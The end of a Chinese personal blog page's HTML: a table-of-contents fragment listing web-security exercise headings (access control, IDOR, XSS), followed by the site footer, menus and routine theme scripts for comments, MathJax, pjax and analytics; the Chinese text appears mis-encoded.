class="toc-text">11.</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%96%91%E9%97%AE%EF%BC%9A"><span class="toc-text">ç–‘é—®ï¼š</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-13"><span class="toc-text">12-13</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Broken-Access-Control%EF%BC%88%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%AD%E6%96%AD%EF%BC%89"><span class="toc-text">7.Broken Access Controlï¼ˆè®¿é—®æ§åˆ¶ä¸­æ–­ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Insecure-Direct-Object-References%EF%BC%88%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%BC%95%E7%94%A8%E5%AF%B9%E8%B1%A1%EF%BC%89"><span class="toc-text">1.Insecure Direct Object Referencesï¼ˆä¸å®‰å…¨çš„ç›´æ¥å¼•ç”¨å¯¹è±¡ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4"><span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-8"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-6"><span class="toc-text">3.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-10"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-7"><span class="toc-text">6.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Missing-Function-Level-Access-Control%EF%BC%88%E7%BC%BA%E5%B0%91%E5%8A%9F%E8%83%BD%E7%BA%A7%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%89"><span class="toc-text">2.Missing Function Level Access Controlï¼ˆç¼ºå°‘åŠŸèƒ½çº§è®¿é—®æ§åˆ¶ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-9"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-7"><span class="toc-text">3.</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%AE%80%E5%8D%95%E5%81%9A%E6%B3%95"><span class="toc-text">1.ç®€å•åšæ³•</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%BF%9B%E9%98%B6%E5%81%9A%E6%B3%95"><span class="toc-text">2.è¿›é˜¶åšæ³•</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-Cross-Site-Scripting-XSS"><span class="toc-text">8.Cross-Site Scripting(XSS)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-10"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8"><span class="toc-text">3.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-9"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-11"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-5"><span class="toc-text">7.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-4"><span class="toc-text">9.</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-color: transparent;"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">æ ¼è¨€ğŸ§¬</p><div class="bg-ad"><div>å†çœ‹çœ‹é‚£ä¸ªå…‰ç‚¹ï¼Œå®ƒå°±åœ¨è¿™é‡Œï¼Œè¿™æ˜¯å®¶å›­ï¼Œè¿™æ˜¯æˆ‘ä»¬ â€”â€” ä½ æ‰€çˆ±çš„æ¯ä¸€ä¸ªäººï¼Œä½ è®¤è¯†çš„ä¸€ä¸ªäººï¼Œä½ å¬è¯´è¿‡çš„æ¯ä¸€ä¸ªäººï¼Œæ›¾ç»æœ‰è¿‡çš„æ¯ä¸€ä¸ªäººï¼Œéƒ½åœ¨å®ƒä¸Šé¢åº¦è¿‡ä»–ä»¬çš„ä¸€ç”Ÿâœ¨</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://stellarium.org/">ç‚¹å‡»å¼€å¯æ˜Ÿè¾°ä¹‹æ—…</a></div></div></div><div class="t-t-r"><p class="ft-t t-l-t">çŒœä½ æƒ³çœ‹ğŸ’¡</p><ul class="ft-links"><li><a href="/life/music">å¬ç‚¹éŸ³ä¹</a><a href="/box/nav/">ç½‘å€å¯¼èˆª</a></li><li><a href="/social/link/">æˆ‘çš„æœ‹å‹</a><a href="/comments/">ç•™ç‚¹ä»€ä¹ˆ</a></li><li><a href="/personal/about/">å…³äºä½œè€…</a><a href="/archives/">æ–‡ç« å½’æ¡£</a></li><li><a href="/categories/">æ–‡ç« åˆ†ç±»</a><a href="/tags/">æ–‡ç« æ ‡ç­¾</a></li><li><a href="/box/gallery/">æˆ‘çš„ç”»å»Š</a><a href="/personal/bb/">æˆ‘çš„å” å¨</a></li><li><a href="/site/time/">å»ºè®¾è¿›ç¨‹</a><a href="/site/census/">ç½‘ç«™ç»Ÿè®¡</a></li></ul></div></div></div><div class="ft-item-2"><p class="ft-t">æ¨èå‹é“¾âŒ›</p><div class="ft-img-group"><div class="img-group-item"><a target="_blank" rel="noopener" href="https://www.fomal.cc/" title="FomalhautğŸ¥"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://www.fomal.cc/assets/avatar.webp" alt=""/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://nullpointer.top/" title="å’Œå…‰åŒå°˜"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://www.nullpointer.top/img/avatar_hu63c7d7d33625004ecc1bebcc651d1be3_23616_300x0_resize_q75_box.jpg" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div></div></div></div><div class="copyright"><span><b>&copy;2022-2024</b></span><span><b>&nbsp;&nbsp;By NoneVector</b></span></div><div id="workboard"></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button><button class="share" type="button" title="å³é”®æ¨¡å¼" onclick="changeMouseMode()"><i class="fas fa-mouse"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog right_side"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button class="share" type="button" title="åˆ†äº«é“¾æ¥" onclick="share()"><i class="fas fa-share-nodes"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i><span id="percent">0<span>%</span></span></button><button id="go-down" type="button" title="ç›´è¾¾åº•éƒ¨" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åº“åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" href="javascript:rmf.scrollToTop();"><i class="fa fa-arrow-up"></i></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>å¤åˆ¶</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.baidu.com/s?wd=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa fa-search"></i><span>ç™¾åº¦æœç´¢</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>è½¬åˆ°é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>ç²˜è´´</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fas fa-comment"></i><span>ç©ºé™è¯„è®º</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>å¤åˆ¶æœ¬æ–‡åœ°å€</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>æ–°çª—å£æ‰“å¼€</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>è½¬åˆ°é“¾æ¥</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>å¤åˆ¶é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>ä¿å­˜å›¾ç‰‡</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>åœ¨æ–°çª—å£æ‰“å¼€</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>å¤åˆ¶å›¾ç‰‡é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:randomPost()"><i class="fa fa-paper-plane"></i><span>éšä¾¿é€›é€›</span></a><a class="rightMenu-item" href="javascript:switchNightMode();"><i class="fa fa-moon"></i><span>æ˜¼å¤œåˆ‡æ¢</span></a><a class="rightMenu-item" href="/personal/about/"><i class="fa fa-info-circle"></i><span>å…³äºåšå®¢</span></a><a class="rightMenu-item" href="javascript:toggleWinbox();"><i class="fas fa-cog"></i><span>ç¾åŒ–è®¾ç½®</span></a><a class="rightMenu-item" href="javascript:rmf.fullScreen();"><i class="fas fa-expand"></i><span>åˆ‡æ¢å…¨å±</span></a><a class="rightMenu-item" href="javascript:window.print();"><i class="fa-solid fa-print"></i><span>æ‰“å°é¡µé¢</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.umd.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js" type="module"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/vanilla-lazyload/17.3.1/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script async="async">var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())
setTimeout(function(){preloader.endLoading();}, 5000);
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://wxxtwikoo.nonevector.top/',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://wxxtwikoo.nonevector.top/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.staticfile.org/twikoo/1.6.8/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[å›¾ç‰‡]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[é“¾æ¥]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[ä»£ç ]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://wxxtwikoo.nonevector.top/',
        region: '',
        pageSize: 5,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.innerHTML= "æ— æ³•è·å–è¯„è®ºï¼Œè¯·ç¡®è®¤ç›¸å…³é…ç½®æ˜¯å¦æ­£ç¡®"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.staticfile.org/twikoo/1.6.8/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += 'æ²¡æœ‰è¯„è®º'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom.innerHTML= result
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script src="https://unpkg.zhimg.com/jquery@3.7.0/dist/jquery.min.js"></script><script async src="https://cdn1.tianli0.top/npm/vue@2.6.14/dist/vue.min.js"></script><script async src="https://cdn1.tianli0.top/npm/element-ui@2.15.6/lib/index.js"></script><script async src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script><script defer type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script async src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script defer src="https://cdn1.tianli0.top/gh/nextapps-de/winbox/dist/winbox.bundle.min.js"></script><script async src="//at.alicdn.com/t/c/font_4255441_r3xftclwcht.js"></script><script async src="https://cdn.wpon.cn/2022-sucai/Gold-ingot.js"></script><canvas id="universe"></canvas><canvas id="snow"></canvas><script defer src="/js/fomal.js"></script><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn1.tianli0.top/npm/js-heo@1.0.12/metingjs/Meting.min.js"></script><script src="https://lib.baomitu.com/pjax/0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#web_bg",".js-pjax","#bibi","body > title","#app","#tag-echarts","#posts-echart","#categories-echarts"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
    var parent = document.getElementById('recent-posts');
    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://nonevector.top/categories/ç®—æ³•/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¡ NVã®ç®—æ³•å­¦ä¹ ç¬”è®° (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://nonevector.top/categories/CTF/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¼ NVã®CTFå­¦ä¹ ç¬”è®° (2)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://nonevector.top/categories/å¯†ç å­¦/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸŸ NVã®å¯†ç å­¦ç¬”è®° (12)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://nonevector.top/categories/éšè®°/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¥ NVã®é›¶ç¢çŸ¥è¯†ç‚¹ (5)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item" style="visibility: hidden"></div><div class="magnet_item" style="visibility: hidden"></div><a class="magnet_link_more"  href="https://nonevector.top/categories/" style="flex:1;text-align: center;margin-bottom: 10px;">æŸ¥çœ‹æ›´å¤š...</a></div></div>';
    console.log('å·²æŒ‚è½½magnet')
    parent.insertAdjacentHTML("afterbegin",child)}
     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(33.333333333333336% - 5px);background: #e9e9e9;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: var(--text-bg-hover)}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
    <style></style><script data-pjax>
  function butterfly_footer_beautify_injector_config(){
    var parent_div_git = document.getElementById('footer-wrap');
    var item_html = '<p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="åšå®¢æ¡†æ¶ä¸ºHexo_v6.2.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="ä¸»é¢˜ç‰ˆæœ¬Butterfly_v4.3.1" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="æœ¬ç«™é‡‡ç”¨å¤šçº¿éƒ¨ç½²ï¼Œä¸»çº¿è·¯æ‰˜ç®¡äºVercel" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://dashboard.4everland.org/" style="margin-inline:5px" data-title="æœ¬ç«™é‡‡ç”¨å¤šçº¿éƒ¨ç½²ï¼Œå¤‡ç”¨çº¿è·¯æ‰˜ç®¡äº4EVERLAND" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="æœ¬ç«™é¡¹ç›®ç”±Githubæ‰˜ç®¡" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20235457/" style="margin-inline:5px" data-title="æœ¬ç«™å·²åŠ å…¥èŒICPè±ªåå¥—é¤ï¼ŒèŒICPå¤‡20235457å·" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/%E8%90%8CICP%E5%A4%87-20235457%E5%8F%B7-ff1385?logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAAXNSR0IArs4c6QAAAARzQklUCAgICHwIZIgAABHOSURBVHic7ZtpmFTF1cd/dXuf6VmYnhlAdiQsGkEWAQEVNb4KGsW8btGAxo1FFAIuBAyLa1BQUFGRqCB5RY3mSWIUI0beyCaLgKjI4gayjszWPT3T6618OLfn9gzTyMCgXzzP00/fW1Vd95z/PVudqoaf6Cf6iX4M0lo79P/vv09vLL1fa+34sfhw/tAP1Fo7uHf1dJo9kk9F6U2goUXLfP3g2kom952mlEr+kPyoH+IhWmtlzv9slvHEyuZs/dLA5R5GtseHw5ABCRPC0RoS8b+ZvbuYxvhBB/lN5zuVUvpE83bCANBaK5bufdR8/INWxrJPweBi/J4cXA5QKjXI4iLtPpaAUDQEjre4rCdMHLSPs4pPGBhNDoD+tPI+c87KLsaijyBecxHZ7ly8LutpSoQ0NVTHIJqQdq8LfC4wlD1GA5E4VEeD+HLe4Za+mOPP2u3o6L2rKfltMgCS01fPMOatPoXvDg7G6ys8XCANkQRUR9HZOaiRA9B3D0JVJ9AzP0C9sBbi1ZDtITNgkUratllmjh2w1XF3n2lNwfdxAaBf+HwqT67qwaYd4HSdhd9ThMM4XKWrYqANuKIPjD8TPbAYhbzkdAb0u3tRc1fD25vBQMBw1zOZRBKqYt+RTKzQA09F3T7wY3XNyfcdqwyNBkC/t28cc1cP5s2PQDEAv6cYt/NwJqvjEI9D/1Pg9n5wb